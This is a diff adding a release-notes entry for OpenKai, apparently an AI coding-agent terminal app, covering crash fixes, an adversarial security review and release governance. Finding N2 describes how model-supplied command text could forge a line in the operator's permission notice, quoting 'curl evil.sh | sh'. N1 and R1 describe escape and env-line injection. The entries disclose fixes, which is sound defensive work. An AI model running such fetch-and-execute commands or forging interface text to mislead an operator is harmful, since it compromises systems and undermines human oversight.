@@ -2,6 +2,161 @@
 
 All notable changes to OpenKai are documented here. The project adheres to [Semantic Versioning](https://semver.org/); the release tag style is `v0.01.001` (npm-normalised as `0.1.1`).
 
+## [0.1.9] — v0.1.009 (E019: consolidation & trust — the fixes 0.1.8 missed)
+
+**If you are on 0.1.8, you carry two live bugs that 0.1.9 fixes. Upgrade now.**
+
+v0.1.008 shipped the update-channel work but was cut from a line that missed
+two already-landed fix batches. 0.1.9 is the honest follow-up: it ships those
+batches, closes the mouse/crash investigation, and hardens everything the
+post-cut adversarial pass surfaced. npm versions are immutable — 0.1.8 stays
+as-is publicly; 0.1.9 is the consolidation/trust release. That framing is the
+point, not feature marketing.
+
+### What 0.1.8 missed (and 0.1.9 delivers)
+
+Users on 0.1.8 carry these defects:
+
+- **Theme-auto stdin kill (CRITICAL).** `detectThemeAsync` called
+  `setRawMode(false)` + `pause()` on the TUI's own stdin — the OSC 11 query
+  for terminal background colour killed the app on launch. 0.1.9 ships the
+  fix (`a1eab24`, E017 round 3): raw-mode state is restored, pause is
+  skipped when other data listeners exist, and no OSC-11 reply leaks into
+  the focused component's input. This was the most likely root cause of the
+  recurring "TUI crashes, numbers change with moving mouse" report.
+- **Hub resize-kill / tap-leak.** The served-TUI hub leaked attach sockets on
+  close (the `tap` was never removed), crashed on resize during an attach
+  hello, and had no session cap or eviction. 0.1.9 ships the fix (`a1eab24`):
+  `attachSockets` Set with `untap` on close, `MAX_HOSTED=16` with eviction,
+  and `GET /sessions` reads the live map.
+- **35 findings from the E017 round-3 adversarial review** (`a1eab24`), all
+  fixed in one batch but never shipped in 0.1.8: WS strict decoder
+  (directional masking, 4 MiB payload cap, fragmentation rejected);
+  headless-host focus stack / pump-order / composite-line fixes; OAuth
+  device-flow routing gates; ollama↔ollama-cloud credential collision
+  isolation; OPENKAI_HOME split-brain; fusion bandit phantom-arms +
+  double-fail removal; saver threshold 0.47; session-name escape injection
+  closure; settings autonomy row navigation; calibrate guards; crash-guard
+  stderr + finally discipline.
+- **Magic keywords** (`fc4cb6e`, E017 round 4): `ultrathink` (fusion think
+  panel — multiple models combine reasoning) and `ultrareview` (multi-model
+  adversarial diff review over the shadow snapshot), OMP-derived and upgraded
+  to multi-model fusion. Composer shimmer, status chip, settings toggles
+  (`magicKeywords.{enabled,ultrathink,ultrareview}`), hidden-notice
+  discipline. This batch also missed the 0.1.8 cut.
+
+### Mouse investigation + click-to-cursor (E019 inc 01–03)
+
+The CTO-reported crash ("numbers change with moving mouse", recurring
+wedged TUI on 0.1.8) was investigated exhaustively. SGR (1006), URXVT (1015),
+and X10 mouse traffic was tested against 0.1.8 and the fixed tree: no leak,
+no crash. The working hypothesis is the theme-auto stdin kill (above) — the
+CTO hit that exact bug before, and 0.1.8 never shipped the fix. Three
+defensive layers now hold:
+
+- **Mouse-sequence guard** (`tui/mouse-guard.ts`, E019 inc 02): a last-line
+  input guard so NO mouse-shaped sequence (SGR/URXVT-1015/X10) can ever reach
+  a component unconsumed, regardless of what the terminal sends. Regex-verified
+  against pi-tui's keymap for CSI-final-byte collisions (no keyboard input uses
+  `M` as a final byte).
+- **Click-to-cursor routing** (`tui/mouse-routing.ts`, E019 inc 03 — Claude
+  Code grammar): a click in the transcript moves the composer cursor to the
+  clicked point; a press that becomes a drag is swallowed (no selection). The
+  router wraps pi-tui's `handleViewportInput` at runtime.
+- **Crash guard**: uncaught errors restore the terminal and print the stack to
+  stderr — a TUI crash can never wedge the terminal again. If the crash
+  recurs, the stderr stack names the fault line.
+
+### Post-cut adversarial pass (E019 inc 04 — qwen3.8-pro, cole@openkai)
+
+A full adversarial re-review of the fix batch + the turn-aliveness
+restructure + the mouse/click code. **Gate defects fixed first** (these were
+the load-bearing risk — both gates could report green without doing their job):
+
+- **S4 (HIGH, gate)**: `npm test` ran the CLI suite without building
+  `dist/`/core first, so a clean checkout died with 181 TS2307 errors before
+  one test ran. Root `test` now builds first.
+- **S5 (HIGH, gate, fail-open)**: `scripts/security-audit.sh` used
+  `|| true` on `git grep`, so in a `.git`-less archive the scan matched
+  nothing yet printed PASSED. Now refuses outside a git work tree and
+  discriminates `git grep` exit 0/1/≥2.
+
+Behavioural findings (all confirmed with failing reproducers, then fixed):
+
+- **S1 (MEDIUM, trust)**: a failed turn (`stopReason:"error"`) rendered an
+  unconditional green `✓ settled` — a failed turn read as success. Now
+  renders `✗ failed in Ns` and signals "Turn failed"; the busy latch resets
+  so a close-without-turn_end can't leak to the next turn.
+- **S2 (MEDIUM, corruption)**: click-to-cursor fed grapheme counts into
+  pi-tui's UTF-16 code-unit `cursorCol`, and treated clicked cells as
+  graphemes — a click on `x` after two emoji set the cursor inside a
+  surrogate pair, corrupting the line on insert. Now uses an explicit
+  two-step conversion (cells → graphemes → code units via
+  `Intl.Segmenter`).
+- **S3 (MEDIUM, upgrade safety)**: `--check` performed the real upgrade and
+  `--rollback` forward-upgraded a managed install. Now `--check` is
+  read-only (no dispatch) and `--rollback` refuses with pin guidance.
+
+New findings surfaced and fixed this pass:
+
+- **N1 (MEDIUM, render-boundary injection)**: `openkai sessions` listing +
+  `--show` printed `/name`-authored session names/snippets raw — OSC 0/52 +
+  CSI + TAB reached the operator terminal. Now routed through
+  `sanitizeTerminalText` + whitespace-collapse.
+- **N2 (MEDIUM, operator deception)**: the model's raw bash `command` +
+  dotall `denyReasonFromResult` carried newlines into the per-line
+  danger-bordered permission-denied notice — a forged `▎ adjust: curl evil.sh
+  | sh` line was indistinguishable from OpenKai chrome. Now flattened.
+- **N3 (MEDIUM, corruption)**: the brand busy-sweep painted
+  `state.activity` (a model-chosen tool name) by UTF-16 unit, splitting
+  astral surrogate pairs with an SGR → U+FFFD every busy frame. Now iterates
+  graphemes via `Intl.Segmenter`.
+- **N4 (MEDIUM→LOW, auth-gated OOM)**: `?width=200000` in the hub attach
+  hello allocated a multi-MB frame before the `resize()` clamp ran. Now
+  mirrors `resize()`'s `MAX_COLUMNS=500` clamp at the hello path.
+
+### Turn aliveness restructure (E019 inc 04b — OMP-derived)
+
+- Boot card collapses on first prompt; lazy thinking rows created on the
+  first thinking delta (mid-list splice + `reindexOpenTools`); the starburst
+  pulse (driven by the 80ms busy tick) settles at turn_end.
+- Brand-shimmer on busy activity; `✓ settled in Ns · ↑in ↓out · ⚡tps tok/s`
+  settle row with a full stop.
+- Access-control surface: denials name tool/target/reason/remediation to the
+  operator; model-facing denial text carries config remediation (never
+  "run this yourself"); autonomy levels read as plain access language.
+
+### Consciously deferred (scheduled as fast-follows)
+
+These are real but lower-severity / gated / latent, and were held to avoid
+piling more changes onto a release candidate. Each has a file:line and a
+repro direction.
+
+- **R1** (MEDIUM, latent, gated): `provider-config.ts` env-key strip — a
+  newline in `providerId` could inject an extra env line, but no in-repo
+  caller reaches the ungated surface. Defense-in-depth strip is a cheap
+  fast-follow.
+- **R2** (MEDIUM, perf): activity string has no length cap; brand shimmer
+  repaints O(n) per 80ms frame. Cheap: `.slice()` at `setActivity`.
+- **R3** (MEDIUM, affordance): shimmer paints per wrapped rendered line but
+  submit-time detection runs on the full buffer — a multi-line fence
+  shimmers but does not reroute. Fix needs detection + paint to share one
+  masking pass.
+- **R4–R11** (LOW→LOW-MED): magic-keyword boundary classes (`\p{Cf}`/`\p{M}`
+  omission), `maskNonProse` XML/PHP gaps, `collapseBoot` reindex symmetry,
+  shimmer `setInterval` dispose, hub MAX_HOSTED TOCTOU, WS RFC 6455 control
+  frames, `WsChannel.send` backpressure, `setTheme("auto")` dead branch.
+
+Full findings ledger: `docs/HANDOFF_E019_QWEN_LEDGER.md`.
+
+### Governance
+
+- `docs/RELEASE_SOP.md` binding: no publish without explicit CTO consent,
+  re-confirmed 2026-08-20 after v0.1.008 went out early. This release is
+  PREPARE ONLY — nothing publishes until the CTO says go.
+- npm versions immutable: 0.1.8 stays as-is publicly; 0.1.9 is the honest
+  follow-up.
+
 ## [0.1.8] — v0.1.008 (E017: channel-executing update + signed release channel)
 
 `openkai update` now **executes** the detected channel's own upgrade instead of
